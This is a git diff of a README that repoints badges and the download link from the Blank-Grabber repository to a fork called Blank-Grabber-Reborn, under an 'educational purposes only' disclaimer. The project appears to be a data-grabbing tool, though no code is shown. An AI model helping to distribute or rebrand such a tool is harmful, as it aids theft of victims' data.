@@ -5,15 +5,15 @@
    <kbd>
    <img  src="https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png">
    </kbd><br><br>
-   <img src="https://img.shields.io/github/languages/top/Blank-c/Blank-Grabber">
-   <img src="https://img.shields.io/github/stars/Blank-c/Blank-Grabber">
-   <img src="https://img.shields.io/github/forks/Blank-c/Blank-Grabber">
+   <img src="https://img.shields.io/github/languages/top/Mc-gabys/Blank-Grabber-Reborn">
+   <img src="https://img.shields.io/github/stars/Mc-gabys/Blank-Grabber-Reborn">
+   <img src="https://img.shields.io/github/forks/Mc-gabys/Blank-Grabber-Reborn">
    <br>
-   <img src="https://img.shields.io/github/last-commit/Blank-c/Blank-Grabber">
-   <img src="https://img.shields.io/github/license/Blank-c/Blank-Grabber">
+   <img src="https://img.shields.io/github/last-commit/Mc-gabys/Blank-Grabber-Reborn">
+   <img src="https://img.shields.io/github/license/Mc-gabys/Blank-Grabber-Reborn">
    <br>
-   <img src="https://img.shields.io/github/issues/Blank-c/Blank-Grabber">
-   <img src="https://img.shields.io/github/issues-closed/Blank-c/Blank-Grabber">
+   <img src="https://img.shields.io/github/issues/Mc-gabys/Blank-Grabber-Reborn">
+   <img src="https://img.shields.io/github/issues-closed/Mc-gabys/Blank-Grabber-Reborn">
    <br>
    <br>
    <img src="https://repobeats.axiom.co/api/embed/3183aa00d01f8636a5cbc17344c36168eff93aec.svg">
@@ -51,7 +51,7 @@ Blank-c
 
 ## Download
 
-[![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/Blank-c/Blank-Grabber/archive/refs/heads/main.zip)
+[![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/Mc-gabys/Blank-Grabber-Reborn/archive/refs/heads/main.zip)
 
 **Disclaimer:** This program is provided for educational and research purposes only. The creator of this program does not condone or support any illegal or malicious activity, and will not be held responsible for any such actions taken by others who may use this program. By downloading or using this program, you acknowledge that you are solely responsible for any consequences that may result from the use of this program.
 
